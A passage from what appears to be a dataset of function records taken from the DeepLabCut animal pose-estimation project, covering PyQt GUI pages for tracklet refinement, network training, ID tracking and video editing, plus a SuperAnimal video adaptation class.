    if self.config == '':
        msg = QtWidgets.QMessageBox()
        msg.setIcon(QtWidgets.QMessageBox.Critical)
        msg.setText('Please choose the config.yaml file to load the project')
        msg.setWindowTitle('Error')
        msg.setMinimumWidth(400)
        self.logo_dir = os.path.dirname(os.path.realpath('logo.png')) + os.path.sep
        self.logo = self.logo_dir + '/assets/logo.png'
        msg.setWindowIcon(QIcon(self.logo))
        msg.setStandardButtons(QtWidgets.QMessageBox.Ok)
        msg.exec_()
        self.loaded = False
    else:
        self.logo_dir = os.path.dirname(os.path.realpath('logo.png')) + os.path.sep
        self.logo = self.logo_dir + '/assets/logo.png'
        self.loaded = True
        self.accept()
        self.close()"
AlexEMG/DeepLabCut,__init__,"def __init__(self, root, parent, h1_description):
    super(RefineTracklets, self).__init__(root, parent, h1_description)
    self._set_page()"
AlexEMG/DeepLabCut,files,"@property
def files(self):
    return self.video_selection_widget.files"
AlexEMG/DeepLabCut,_set_page,"def _set_page(self):
    self.main_layout.addWidget(_create_label_widget('Video Selection', 'font:bold'))
    self.video_selection_widget = VideoSelectionWidget(self.root, self)
    self.main_layout.addWidget(self.video_selection_widget)
    self.main_layout.addWidget(_create_label_widget('Attributes', 'font:bold'))
    self.layout_attributes = _create_horizontal_layout()
    self._generate_layout_attributes(self.layout_attributes)
    self.main_layout.addLayout(self.layout_attributes)
    self.container_layout = _create_horizontal_layout(margins=(0, 0, 0, 0))
    self.layout_refinement_settings = _create_grid_layout(margins=(20, 0, 0, 0))
    self._generate_layout_refinement(self.layout_refinement_settings)
    self.container_layout.addLayout(self.layout_refinement_settings)
    self.layout_filtering_settings = _create_grid_layout(margins=(20, 0, 0, 0))
    self._generate_layout_filtering(self.layout_filtering_settings)
    self.container_layout.addLayout(self.layout_filtering_settings)
    self.main_layout.addLayout(self.container_layout)
    self.stitch_tracklets_btn = QtWidgets.QPushButton('(Re-)run stitching')
    self.stitch_tracklets_btn.setMinimumWidth(150)
    self.stitch_tracklets_btn.clicked.connect(self.create_tracks)
    self.edit_inferencecfg_btn = QtWidgets.QPushButton('Edit inference_cfg.yaml')
    self.edit_inferencecfg_btn.setMinimumWidth(150)
    self.edit_inferencecfg_btn.clicked.connect(self.open_inferencecfg_editor)
    self.filter_tracks_button = QtWidgets.QPushButton('Filter tracks ( + .csv)')
    self.filter_tracks_button.setMinimumWidth(150)
    self.filter_tracks_button.clicked.connect(self.filter_tracks)
    self.launch_button = QtWidgets.QPushButton('Launch track refinement GUI')
    self.launch_button.setMinimumWidth(150)
    self.launch_button.clicked.connect(self.refine_tracks)
    self.merge_button = QtWidgets.QPushButton('Merge dataset')
    self.merge_button.setMinimumWidth(150)
    self.merge_button.clicked.connect(self.merge_dataset)
    self.merge_button.setEnabled(False)
    self.main_layout.addWidget(self.edit_inferencecfg_btn, alignment=Qt.AlignRight)
    self.main_layout.addWidget(self.stitch_tracklets_btn, alignment=Qt.AlignRight)
    self.main_layout.addWidget(self.launch_button, alignment=Qt.AlignRight)
    self.main_layout.addWidget(self.filter_tracks_button, alignment=Qt.AlignRight)
    self.main_layout.addWidget(self.merge_button, alignment=Qt.AlignRight)
    self.help_button = QtWidgets.QPushButton('Help')
    self.help_button.clicked.connect(self.show_help_dialog)
    self.main_layout.addWidget(self.help_button, alignment=Qt.AlignLeft)"
AlexEMG/DeepLabCut,show_help_dialog,"def show_help_dialog(self):
    dialog = QtWidgets.QDialog(self)
    layout = QtWidgets.QVBoxLayout()
    label = QtWidgets.QLabel(deeplabcut.stitch_tracklets.__doc__, self)
    scroll = QtWidgets.QScrollArea()
    scroll.setVerticalScrollBarPolicy(Qt.ScrollBarAlwaysOn)
    scroll.setHorizontalScrollBarPolicy(Qt.ScrollBarAlwaysOff)
    scroll.setWidgetResizable(True)
    scroll.setWidget(label)
    layout.addWidget(scroll)
    dialog.setLayout(layout)
    dialog.exec_()"
AlexEMG/DeepLabCut,_generate_layout_attributes,"def _generate_layout_attributes(self, layout):
    shuffle_text = QtWidgets.QLabel('Shuffle')
    self.shuffle = ShuffleSpinBox(root=self.root, parent=self)
    num_animals_text = QtWidgets.QLabel('Number of animals in video')
    self.num_animals_in_videos = QtWidgets.QSpinBox()
    self.num_animals_in_videos.setValue(len(self.root.all_individuals))
    self.num_animals_in_videos.setMaximum(100)
    self.num_animals_in_videos.valueChanged.connect(self.log_num_animals)
    layout.addWidget(shuffle_text)
    layout.addWidget(self.shuffle)
    layout.addWidget(num_animals_text)
    layout.addWidget(self.num_animals_in_videos)"
AlexEMG/DeepLabCut,_generate_layout_refinement,"def _generate_layout_refinement(self, layout):
    section_title = _create_label_widget('Refinement Settings', 'font:bold', (0, 50, 0, 0))
    swap_length_label = QtWidgets.QLabel('Min swap length to highlight')
    self.swap_length_widget = QtWidgets.QSpinBox()
    self.swap_length_widget.setValue(2)
    self.swap_length_widget.setMinimumWidth(150)
    self.swap_length_widget.valueChanged.connect(self.log_swap_length)
    max_gap_label = QtWidgets.QLabel('Max gap of missing data to fill')
    self.max_gap_widget = QtWidgets.QSpinBox()
    self.max_gap_widget.setValue(5)
    self.max_gap_widget.setMinimumWidth(150)
    self.max_gap_widget.valueChanged.connect(self.log_max_gap)
    trail_length_label = QtWidgets.QLabel('Visualization trail length')
    self.trail_length_widget = QtWidgets.QSpinBox()
    self.trail_length_widget.setValue(20)
    self.trail_length_widget.setMinimumWidth(150)
    self.trail_length_widget.valueChanged.connect(self.log_trail_length)
    layout.addWidget(section_title, 0, 0)
    layout.addWidget(swap_length_label, 1, 0)
    layout.addWidget(self.swap_length_widget, 1, 1)
    layout.addWidget(max_gap_label, 2, 0)
    layout.addWidget(self.max_gap_widget, 2, 1)
    layout.addWidget(trail_length_label, 3, 0)
    layout.addWidget(self.trail_length_widget, 3, 1)"
AlexEMG/DeepLabCut,_generate_layout_filtering,"def _generate_layout_filtering(self, layout):
    section_title = _create_label_widget('Filtering', 'font:bold', (0, 50, 0, 0))
    filter_label = QtWidgets.QLabel('Filter type')
    self.filter_type_widget = QtWidgets.QComboBox()
    self.filter_type_widget.setMinimumWidth(150)
    options = ['median']
    self.filter_type_widget.addItems(options)
    self.filter_type_widget.currentTextChanged.connect(self.log_filter_type)
    window_length_label = QtWidgets.QLabel('Window length')
    self.window_length_widget = QtWidgets.QSpinBox()
    self.window_length_widget.setValue(5)
    self.window_length_widget.setMinimumWidth(150)
    self.window_length_widget.valueChanged.connect(self.log_window_length)
    layout.addWidget(section_title, 0, 0)
    layout.addWidget(filter_label, 1, 0)
    layout.addWidget(self.filter_type_widget, 1, 1)
    layout.addWidget(window_length_label, 2, 0)
    layout.addWidget(self.window_length_widget, 2, 1)"
AlexEMG/DeepLabCut,log_swap_length,"def log_swap_length(self, value):
    self.root.logger.info(f'Swap length set to {value}')"
AlexEMG/DeepLabCut,log_max_gap,"def log_max_gap(self, value):
    self.root.logger.info(f'Max gap size of missing data to fill set to {value}')"
AlexEMG/DeepLabCut,log_trail_length,"def log_trail_length(self, value):
    self.root.logger.info(f'Visualization trail length set to {value}')"
AlexEMG/DeepLabCut,log_filter_type,"def log_filter_type(self, filter_type):
    self.root.logger.info(f'Filter type set to {filter_type.upper()}')"
AlexEMG/DeepLabCut,log_window_length,"def log_window_length(self, window_length):
    self.root.logger.info(f'Window length set to {window_length}')"
AlexEMG/DeepLabCut,log_num_animals,"def log_num_animals(self, num_animals):
    self.root.logger.info(f'Number of animals in video set to {num_animals}')"
AlexEMG/DeepLabCut,open_inferencecfg_editor,"def open_inferencecfg_editor(self):
    editor = ConfigEditor(self.root.inference_cfg_path)
    editor.show()"
AlexEMG/DeepLabCut,create_tracks,"def create_tracks(self):
    deeplabcut.stitch_tracklets(self.root.config, self.files, videotype=self.video_selection_widget.videotype_widget.currentText(), shuffle=self.shuffle.value(), n_tracks=self.num_animals_in_videos.value())"
AlexEMG/DeepLabCut,filter_tracks,"def filter_tracks(self):
    window_length = self.window_length_widget.value()
    if window_length % 2 != 1:
        raise ValueError('Window length should be odd.')
    videotype = self.video_selection_widget.videotype_widget.currentText()
    deeplabcut.filterpredictions(self.root.config, self.files, videotype=videotype, shuffle=self.shuffle.value(), filtertype=self.filter_type_widget.currentText(), windowlength=self.window_length_widget.value(), save_as_csv=True)"
AlexEMG/DeepLabCut,merge_dataset,"def merge_dataset(self):
    msg = QtWidgets.QMessageBox()
    msg.setIcon(QtWidgets.QMessageBox.Warning)
    msg.setText('Make sure that you have refined all the labels before merging the dataset.If you merge the dataset, you need to re-create the training dataset before you start the training. Are you ready to merge the dataset?')
    msg.setWindowTitle('Warning')
    msg.setStandardButtons(QtWidgets.QMessageBox.Yes | QtWidgets.QMessageBox.No)
    result = msg.exec_()
    if result == QtWidgets.QMessageBox.Yes:
        deeplabcut.merge_datasets(self.root.config, forceiterate=None)
        self.viz.export_to_training_data()"
AlexEMG/DeepLabCut,refine_tracks,"def refine_tracks(self):
    cfg = self.root.cfg
    (DLCscorer, _) = GetScorerName(cfg, self.shuffle.value(), cfg['TrainingFraction'][-1])
    video = list(self.files)[0]
    track_method = cfg.get('default_track_method', 'ellipse')
    method = trackingutils.TRACK_METHODS[track_method]
    dest = str(Path(video).parents[0])
    vname = Path(video).stem
    datafile = os.path.join(dest, vname + DLCscorer + f'{method}.h5')
    (self.manager, self.viz) = deeplabcut.refine_tracklets(self.root.config, datafile, video, min_swap_len=self.swap_length_widget.value(), trail_len=self.trail_length_widget.value(), max_gap=self.max_gap_widget.value())
    self.merge_button.setEnabled(True)"
AlexEMG/DeepLabCut,__init__,"def __init__(self, root, parent, h1_description):
    super(TrainNetwork, self).__init__(root, parent, h1_description)
    default_pose_cfg_path = os.path.join(Path(deeplabcut.__file__).parent, 'pose_cfg.yaml')
    pose_cfg = auxiliaryfunctions.read_plainconfig(default_pose_cfg_path)
    self.display_iters = str(pose_cfg['display_iters'])
    self.save_iters = str(pose_cfg['save_iters'])
    self.max_iters = str(pose_cfg['multi_step'][-1][-1])
    self._set_page()"
AlexEMG/DeepLabCut,_set_page,"def _set_page(self):
    self.main_layout.addWidget(_create_label_widget('Attributes', 'font:bold'))
    self.layout_attributes = _create_grid_layout(margins=(20, 0, 0, 0))
    self._generate_layout_attributes(self.layout_attributes)
    self.main_layout.addLayout(self.layout_attributes)
    self.main_layout.addWidget(_create_label_widget(''))
    self.edit_posecfg_btn = QtWidgets.QPushButton('Edit pose_cfg.yaml')
    self.edit_posecfg_btn.setMinimumWidth(150)
    self.edit_posecfg_btn.clicked.connect(self.open_posecfg_editor)
    self.ok_button = QtWidgets.QPushButton('Train Network')
    self.ok_button.setMinimumWidth(150)
    self.ok_button.clicked.connect(self.train_network)
    self.main_layout.addWidget(self.edit_posecfg_btn, alignment=Qt.AlignRight)
    self.main_layout.addWidget(self.ok_button, alignment=Qt.AlignRight)
    self.help_button = QtWidgets.QPushButton('Help')
    self.help_button.clicked.connect(self.show_help_dialog)
    self.main_layout.addWidget(self.help_button, alignment=Qt.AlignLeft)"
AlexEMG/DeepLabCut,show_help_dialog,"def show_help_dialog(self):
    dialog = QtWidgets.QDialog(self)
    layout = QtWidgets.QVBoxLayout()
    label = QtWidgets.QLabel(deeplabcut.train_network.__doc__, self)
    scroll = QtWidgets.QScrollArea()
    scroll.setVerticalScrollBarPolicy(Qt.ScrollBarAlwaysOn)
    scroll.setHorizontalScrollBarPolicy(Qt.ScrollBarAlwaysOff)
    scroll.setWidgetResizable(True)
    scroll.setWidget(label)
    layout.addWidget(scroll)
    dialog.setLayout(layout)
    dialog.exec_()"
AlexEMG/DeepLabCut,_generate_layout_attributes,"def _generate_layout_attributes(self, layout):
    shuffle_label = QtWidgets.QLabel('Shuffle')
    self.shuffle = ShuffleSpinBox(root=self.root, parent=self)
    dispiters_label = QtWidgets.QLabel('Display iterations')
    self.display_iters_spin = QtWidgets.QSpinBox()
    self.display_iters_spin.setMinimum(1)
    self.display_iters_spin.setMaximum(int(self.max_iters))
    self.display_iters_spin.setValue(1000)
    self.display_iters_spin.valueChanged.connect(self.log_display_iters)
    saveiters_label = QtWidgets.QLabel('Save iterations')
    self.save_iters_spin = QtWidgets.QSpinBox()
    self.save_iters_spin.setMinimum(1)
    self.save_iters_spin.setMaximum(int(self.max_iters))
    self.save_iters_spin.setValue(50000)
    self.save_iters_spin.valueChanged.connect(self.log_save_iters)
    maxiters_label = QtWidgets.QLabel('Maximum iterations')
    self.max_iters_spin = QtWidgets.QSpinBox()
    self.max_iters_spin.setMinimum(1)
    self.max_iters_spin.setMaximum(int(self.max_iters))
    self.max_iters_spin.setValue(100000)
    self.max_iters_spin.valueChanged.connect(self.log_max_iters)
    snapkeep_label = QtWidgets.QLabel('Number of snapshots to keep')
    self.snapshots = QtWidgets.QSpinBox()
    self.snapshots.setMinimum(1)
    self.snapshots.setMaximum(100)
    self.snapshots.setValue(5)
    self.snapshots.valueChanged.connect(self.log_snapshots)
    layout.addWidget(shuffle_label, 0, 0)
    layout.addWidget(self.shuffle, 0, 1)
    layout.addWidget(dispiters_label, 0, 2)
    layout.addWidget(self.display_iters_spin, 0, 3)
    layout.addWidget(saveiters_label, 0, 4)
    layout.addWidget(self.save_iters_spin, 0, 5)
    layout.addWidget(maxiters_label, 0, 6)
    layout.addWidget(self.max_iters_spin, 0, 7)
    layout.addWidget(snapkeep_label, 0, 8)
    layout.addWidget(self.snapshots, 0, 9)"
AlexEMG/DeepLabCut,log_display_iters,"def log_display_iters(self, value):
    self.root.logger.info(f'Display iters set to {value}')"
AlexEMG/DeepLabCut,log_save_iters,"def log_save_iters(self, value):
    self.root.logger.info(f'Save iters set to {value}')"
AlexEMG/DeepLabCut,log_max_iters,"def log_max_iters(self, value):
    self.root.logger.info(f'Max iters set to {value}')"
AlexEMG/DeepLabCut,log_snapshots,"def log_snapshots(self, value):
    self.root.logger.info(f'Max snapshots to keep set to {value}')"
AlexEMG/DeepLabCut,open_posecfg_editor,"def open_posecfg_editor(self):
    editor = ConfigEditor(self.root.pose_cfg_path)
    editor.show()"
AlexEMG/DeepLabCut,train_network,"def train_network(self):
    config = self.root.config
    shuffle = int(self.shuffle.value())
    max_snapshots_to_keep = int(self.snapshots.value())
    displayiters = int(self.display_iters_spin.value())
    saveiters = int(self.save_iters_spin.value())
    maxiters = int(self.max_iters_spin.value())
    deeplabcut.train_network(config, shuffle, gputouse=None, max_snapshots_to_keep=max_snapshots_to_keep, autotune=None, displayiters=displayiters, saveiters=saveiters, maxiters=maxiters)
    msg = QtWidgets.QMessageBox()
    msg.setIcon(QtWidgets.QMessageBox.Information)
    msg.setText('The network is now trained and ready to evaluate.')
    msg.setInformativeText(""Use the function 'evaluate_network' to evaluate the network."")
    msg.setWindowTitle('Info')
    msg.setMinimumWidth(900)
    self.logo_dir = os.path.dirname(os.path.realpath('logo.png')) + os.path.sep
    self.logo = self.logo_dir + '/assets/logo.png'
    msg.setWindowIcon(QIcon(self.logo))
    msg.setStandardButtons(QtWidgets.QMessageBox.Ok)
    msg.exec_()"
AlexEMG/DeepLabCut,__init__,"def __init__(self, root, parent, h1_description):
    super(UnsupervizedIdTracking, self).__init__(root, parent, h1_description)
    self._set_page()"
AlexEMG/DeepLabCut,files,"@property
def files(self):
    return self.root.video_files"
AlexEMG/DeepLabCut,_set_page,"def _set_page(self):
    self.main_layout.addWidget(_create_label_widget('Video Selection', 'font:bold'))
    self.video_selection_widget = VideoSelectionWidget(self.root, self)
    self.main_layout.addWidget(self.video_selection_widget)
    self.main_layout.addWidget(_create_label_widget('Attributes', 'font:bold'))
    self.layout_attributes = _create_grid_layout(margins=(20, 0, 0, 0))
    self._generate_layout_attributes(self.layout_attributes)
    self.main_layout.addLayout(self.layout_attributes)
    self.run_transformer_button = QtWidgets.QPushButton('Run transformer')
    self.run_transformer_button.clicked.connect(self.run_transformer)
    self.main_layout.addWidget(self.run_transformer_button, alignment=Qt.AlignRight)
    self.help_button = QtWidgets.QPushButton('Help')
    self.help_button.clicked.connect(self.show_help_dialog)
    self.main_layout.addWidget(self.help_button, alignment=Qt.AlignLeft)"
AlexEMG/DeepLabCut,show_help_dialog,"def show_help_dialog(self):
    dialog = QtWidgets.QDialog(self)
    layout = QtWidgets.QVBoxLayout()
    label = QtWidgets.QLabel(deeplabcut.transformer_reID.__doc__, self)
    scroll = QtWidgets.QScrollArea()
    scroll.setVerticalScrollBarPolicy(Qt.ScrollBarAlwaysOn)
    scroll.setHorizontalScrollBarPolicy(Qt.ScrollBarAlwaysOff)
    scroll.setWidgetResizable(True)
    scroll.setWidget(label)
    layout.addWidget(scroll)
    dialog.setLayout(layout)
    dialog.exec_()"
AlexEMG/DeepLabCut,_generate_layout_attributes,"def _generate_layout_attributes(self, layout):
    shuffle_label = QtWidgets.QLabel('Shuffle')
    self.shuffle = ShuffleSpinBox(root=self.root, parent=self)
    trackingtype_label = QtWidgets.QLabel('Tracking method')
    self.tracker_type_widget = QtWidgets.QComboBox()
    self.tracker_type_widget.addItems(['ellipse', 'box'])
    self.tracker_type_widget.currentTextChanged.connect(self.log_tracker_type)
    num_animals_label = QtWidgets.QLabel('Number of animals in videos')
    self.num_animals_in_videos = QtWidgets.QSpinBox()
    self.num_animals_in_videos.setValue(len(self.root.all_individuals))
    self.num_animals_in_videos.setMaximum(100)
    self.num_animals_in_videos.valueChanged.connect(self.log_num_animals)
    num_triplets_label = QtWidgets.QLabel('Number of triplets')
    self.num_triplets = QtWidgets.QSpinBox()
    self.num_triplets.setMaximum(1000000)
    self.num_triplets.setValue(1000)
    self.num_triplets.valueChanged.connect(self.log_num_triplets)
    layout.addWidget(shuffle_label, 0, 0)
    layout.addWidget(self.shuffle, 0, 1)
    layout.addWidget(trackingtype_label, 0, 2)
    layout.addWidget(self.tracker_type_widget, 0, 3)
    layout.addWidget(num_animals_label, 1, 0)
    layout.addWidget(self.num_animals_in_videos, 1, 1)
    layout.addWidget(num_triplets_label, 1, 2)
    layout.addWidget(self.num_triplets, 1, 3)"
AlexEMG/DeepLabCut,log_tracker_type,"def log_tracker_type(self, tracker):
    self.root.logger.info(f'Tracker type set to {tracker.upper()}')"
AlexEMG/DeepLabCut,log_num_animals,"def log_num_animals(self, value):
    self.root.logger.info(f'Num animals set to {value}')"
AlexEMG/DeepLabCut,log_num_triplets,"def log_num_triplets(self, value):
    self.root.logger.info(f'Num triplets set to {value}')"
AlexEMG/DeepLabCut,run_transformer,"def run_transformer(self):
    config = self.root.config
    videos = self.files
    videotype = self.video_selection_widget.videotype_widget.currentText()
    n_tracks = self.num_animals_in_videos.value()
    shuffle = self.shuffle.value()
    track_method = self.tracker_type_widget.currentText()
    func = partial(deeplabcut.transformer_reID, config=config, videos=videos, videotype=videotype, n_tracks=n_tracks, shuffle=shuffle, track_method=track_method)
    (self.worker, self.thread) = move_to_separate_thread(func)
    self.worker.finished.connect(lambda : self.run_transformer_button.setEnabled(True))
    self.worker.finished.connect(lambda : self.root._progress_bar.hide())
    self.thread.start()
    self.run_transformer_button.setEnabled(False)
    self.root._progress_bar.show()"
AlexEMG/DeepLabCut,_crop_video,"def _crop_video(video_path):
    fc = FrameCropper(video_path)
    coords = fc.draw_bbox()
    if not coords:
        return
    (origin_x, origin_y) = coords[:2]
    width = int(coords[2]) - int(coords[0])
    height = int(coords[3]) - int(coords[1])
    writer = auxfun_videos.VideoWriter(video_path)
    writer.set_bbox(origin_x, origin_x + width, origin_y, origin_y + height)
    return writer.crop('cropped', None)"
AlexEMG/DeepLabCut,__init__,"def __init__(self, root, parent, h1_description):
    super(VideoEditor, self).__init__(root, parent, h1_description)
    self._set_page()"
AlexEMG/DeepLabCut,files,"@property
def files(self):
    return self.video_selection_widget.files"
AlexEMG/DeepLabCut,_set_page,"def _set_page(self):
    self.main_layout.addWidget(_create_label_widget('Video Selection', 'font:bold'))
    self.video_selection_widget = VideoSelectionWidget(self.root, self)
    self.main_layout.addWidget(self.video_selection_widget)
    self.main_layout.addWidget(_create_label_widget('Attributes', 'font:bold'))
    self.layout_attributes = _create_grid_layout(margins=(20, 0, 0, 0))
    self._generate_layout_attributes(self.layout_attributes)
    self.main_layout.addLayout(self.layout_attributes)
    self.down_button = QtWidgets.QPushButton('Downsample')
    self.down_button.setMinimumWidth(150)
    self.down_button.clicked.connect(self.downsample_videos)
    self.main_layout.addWidget(self.down_button, alignment=Qt.AlignRight)
    self.trim_button = QtWidgets.QPushButton('Trim')
    self.trim_button.setMinimumWidth(150)
    self.trim_button.clicked.connect(self.trim_videos)
    self.main_layout.addWidget(self.trim_button, alignment=Qt.AlignRight)
    self.crop_button = QtWidgets.QPushButton('Crop')
    self.crop_button.setMinimumWidth(150)
    self.crop_button.clicked.connect(self.crop_videos)
    self.main_layout.addWidget(self.crop_button, alignment=Qt.AlignRight)"
AlexEMG/DeepLabCut,_generate_layout_attributes,"def _generate_layout_attributes(self, layout):
    videoheight_label = QtWidgets.QLabel('Video height (aspect ratio fixed)')
    self.video_height = QtWidgets.QSpinBox()
    self.video_height.setMaximum(1000)
    self.video_height.setValue(256)
    self.video_height.valueChanged.connect(self.log_video_height)
    rotate_label = QtWidgets.QLabel('Rotate video')
    self.video_rotation = QtWidgets.QComboBox()
    self.video_rotation.addItems(['no', 'clockwise', 'specific angle'])
    self.video_rotation.currentTextChanged.connect(self.update_video_rotation)
    trim_start_label = QtWidgets.QLabel('Trim start (sec)')
    self.video_start = QtWidgets.QSpinBox()
    self.video_start.setMaximum(3600)
    self.video_start.setValue(1)
    self.video_start.valueChanged.connect(self.log_video_start)
    trim_end_label = QtWidgets.QLabel('Trim end (sec)')
    self.video_stop = QtWidgets.QSpinBox()
    self.video_stop.setMaximum(3600)
    self.video_stop.setMinimum(1)
    self.video_stop.setValue(30)
    self.video_stop.valueChanged.connect(self.log_video_stop)
    angle_label = QtWidgets.QLabel('Rotation angle (deg)')
    self.rotation_angle = QtWidgets.QDoubleSpinBox()
    self.rotation_angle.setMaximum(360.0)
    self.rotation_angle.setMinimum(-360.0)
    self.rotation_angle.setDecimals(2)
    self.rotation_angle.setValue(0.0)
    self.rotation_angle.setEnabled(False)
    self.rotation_angle.valueChanged.connect(self.log_rotation_angle)
    downsample_title = QtWidgets.QLabel('Downsample and rotate:')
    trim_title = QtWidgets.QLabel('Shorten video (trim):')
    layout.addWidget(downsample_title, 0, 0)
    layout.addWidget(trim_title, 0, 4)
    layout.addWidget(videoheight_label, 1, 0)
    layout.addWidget(self.video_height, 1, 1)
    layout.addWidget(rotate_label, 1, 2)
    layout.addWidget(self.video_rotation, 1, 3)
    layout.addWidget(angle_label, 2, 2)
    layout.addWidget(self.rotation_angle, 2, 3)
    layout.addWidget(trim_start_label, 1, 4)
    layout.addWidget(self.video_start, 1, 5)
    layout.addWidget(trim_end_label, 2, 4)
    layout.addWidget(self.video_stop, 2, 5)"
AlexEMG/DeepLabCut,update_video_rotation,"def update_video_rotation(self, option):
    self.root.logger.info(f'Video rotation set to {option.upper()}')
    if option == 'specific angle':
        self.rotation_angle.setEnabled(True)
    else:
        self.rotation_angle.setEnabled(False)"
AlexEMG/DeepLabCut,log_video_height,"def log_video_height(self, value):
    self.root.logger.info(f'Video height set to {value}')"
AlexEMG/DeepLabCut,log_video_start,"def log_video_start(self, value):
    start_time = time.strftime('%H:%M:%S', time.gmtime(value))
    self.root.logger.info(f'Video start time set to {start_time}')"
AlexEMG/DeepLabCut,log_video_stop,"def log_video_stop(self, value):
    stop_time = time.strftime('%H:%M:%S', time.gmtime(value))
    self.root.logger.info(f'Video start time set to {stop_time}')"
AlexEMG/DeepLabCut,log_rotation_angle,"def log_rotation_angle(self, value):
    self.root.logger.info(f'Rotation angle set to {value}')"
AlexEMG/DeepLabCut,trim_videos,"def trim_videos(self):
    start = time.strftime('%H:%M:%S', time.gmtime(self.video_start.value()))
    stop = time.strftime('%H:%M:%S', time.gmtime(self.video_stop.value()))
    if self.files:
        for video in self.files:
            auxfun_videos.ShortenVideo(video, start, stop)
    else:
        self.root.logger.error('No videos selected...')"
AlexEMG/DeepLabCut,downsample_videos,"def downsample_videos(self):
    if self.files:
        for video in self.files:
            auxfun_videos.DownSampleVideo(video, width=-1, height=self.video_height.value(), rotatecw=self.video_rotation.currentData(), angle=self.rotation_angle.value())
    else:
        self.root.logger.error('No videos selected...')"
AlexEMG/DeepLabCut,crop_videos,"def crop_videos(self):
    if self.files:
        for video in self.files:
            _ = _crop_video(video)
    else:
        self.root.logger.error('No videos selected...')"
AlexEMG/DeepLabCut,__init__,"def __init__(self, video_path, supermodel_name, scale_list=None, videotype='mp4', adapt_iterations=1000, modelfolder='', customized_pose_config='', init_weights=''):
    """"""
        This class supports video adaptation to a super model.

        Parameters
        ----------
        video_path: string
           The string to the path of the video
        init_weights: string
           The path to a superanimal model's checkpoint
        supermodel_name: string
           Currently we support supertopview(LabMice) and superquadruped (quadruped side-view animals)
        scale_list: list
           A list of different resolutions for the spatial pyramid
        videotype: string
           Checks for the extension of the video in case the input to the video is a directory.
 Only videos with this extension are analyzed. The default is ``.avi``
        adapt_iterations: int
           Number of iterations for adaptation training. Empirically 1000 is sufficient. Training longer can cause worse performance depending whether there is occlusion in the video
        modelfolder: string, optional
           Because the API does not need a dlc project, the checkpoint and logs go to this temporary model folder, and otherwise model is saved to the current work place
        customized_pose_config: string, optional
           For future support of non modelzoo model

        Examples
        --------

        from  deeplabcut.modelzoo.apis import SpatiotemporalAdaptation
        video_path = '/mnt/md0/shaokai/openfield_video/m3v1mp4.mp4'
        superanimal_name = 'superanimal_topviewmouse'
        videotype = 'mp4'
        >>> adapter = SpatiotemporalAdaptation(video_path,
                                       superanimal_name,
                                       modelfolder = ""temp_topview"",
                                       videotype = videotype)

        adapter.before_adapt_inference()
        adapter.adaptation_training()
        adapter.after_adapt_inference()


        """"""
    if scale_list is None:
        scale_list = []
    supermodels = parse_available_supermodels()
    if supermodel_name not in supermodels:
        raise ValueError(f""`supermodel_name` should be one of: {', '.join(supermodels)}."")
    self.video_path = video_path
    self.supermodel_name = supermodel_name
    self.scale_list = scale_list
    self.videotype = videotype
    vname = str(Path(self.video_path).stem)
    self.adapt_modelprefix = vname + '_video_adaptation'
    self.adapt_iterations = adapt_iterations
    self.modelfolder = modelfolder
    self.init_weights = init_weights
    if not customized_pose_config:
        dlc_root_path = os.sep.join(deeplabcut.__file__.split(os.sep)[:-1])
        self.customized_pose_config = os.path.join(dlc_root_path, 'pose_estimation_tensorflow', 'superanimal_configs', supermodels[self.supermodel_name])
    else:
        self.customized_pose_config = customized_pose_config"
AlexEMG/DeepLabCut,before_adapt_inference,"def before_adapt_inference(self, make_video=False, **kwargs):
    if self.init_weights != '':
        print('using customized weights', self.init_weights)
        (_, datafiles) = superanimal_inference.video_inference([self.video_path], self.supermodel_name, videotype=self.videotype, scale_list=self.scale_list, init_weights=self.init_weights, customized_test_config=self.customized_pose_config)
    else:
        (self.init_weights, datafiles) = superanimal_inference.video_inference([self.video_path], self.supermodel_name, videotype=self.videotype, scale_list=self.scale_list, customized_test_config=self.customized_pose_config)
    if kwargs.pop('plot_trajectories', True):
        if len(datafiles) == 0:
            print('No data files found for plotting trajectory')
        else:
            _plot_trajectories(datafiles[0])
    if make_video:
        deeplabcut.create_labeled_video('', [self.video_path], videotype=self.videotype, filtered=False, init_weights=self.init_weights, draw_skeleton=True, superanimal_name=self.supermodel_name, **kwargs)"
AlexEMG/DeepLabCut,train_without_project,"def train_without_project(self, pseudo_label_path, **kwargs):
    from deeplabcut.pose_estimation_tensorflow.core.train_multianimal import train
    displayiters = kwargs.pop('displayiters', 500)
    saveiters = kwargs.pop('saveiters', 1000)
    self.adapt_iterations = kwargs.pop('adapt_iterations', self.adapt_iterations)
    train(self.customized_pose_config, displayiters=displayiters, saveiters=saveiters, maxiters=self.adapt_iterations, modelfolder=self.modelfolder, init_weights=self.init_weights, pseudo_labels=pseudo_label_path, video_path=self.video_path, superanimal=self.supermodel_name, **kwargs)"
AlexEMG/DeepLabCut,adaptation_training,"def adaptation_training(self, displayiters=500, saveiters=1000, **kwargs):
    """"""
        There should be two choices, either taking a config, with is then assuming there is a DLC project.
        Or we make up a fake one, then we use a light way convention to do adaptation
        """"""
    DLCscorer = 'DLC_' + Path(self.init_weights).stem
    vname = str(Path(self.video_path).stem)
    video_root = Path(self.video_path).parent
    (_, pseudo_label_path, _, _) = deeplabcut.auxiliaryfunctions.load_analyzed_data(video_root, vname, DLCscorer, False, '')
    if self.modelfolder != '':
        os.makedirs(self.modelfolder, exist_ok=True)
    self.adapt_iterations = kwargs.get('adapt_iterations', self.adapt_iterations)
    if os.path.exists(os.path.join(self.modelfolder, f'snapshot-{self.adapt_iterations}.index')):
        print(f'model checkpoint snapshot-{self.adapt_iterations}.index exists, skipping the video adaptation')
    else:
        self.train_without_project(pseudo_label_path, displayiters=displayiters, saveiters=saveiters, **kwargs)"
AlexEMG/DeepLabCut,after_adapt_inference,"def after_adapt_inference(self, **kwargs):
    pattern = os.path.join(self.modelfolder, f'snapshot-{self.adapt_iterations}.index')
    ref_proj_config_path = ''
    files = glob.glob(pattern)
    if not len(files):
        raise ValueError('Weights were not found.')
    adapt_weights = files[0].replace('.index', '')
    scale_list = kwargs.pop('scale_list', [])
    (_, datafiles) = superanimal_inference.video_inference([self.video_path], self.supermodel_name, videotype=self.videotype, init_weights=adapt_weights, scale_list=scale_list, customized_test_config=self.customized_pose_config)
    if kwargs.pop('plot_trajectories', True):
        _plot_trajectories(datafiles[0])
    deeplabcut.create_labeled_video(ref_proj_config_path, [self.video_path], videotype=self.videotype, filtered=False, init_weights=adapt_weights, draw_skeleton=True, superanimal_name=self.supermodel_name, **kwargs)"
AlexEMG/DeepLabCut,get_multi_scale_frames,"def get_multi_scale_frames(frame, scale_list):
    augs = []
    shapes = []
    for scale in scale_list:
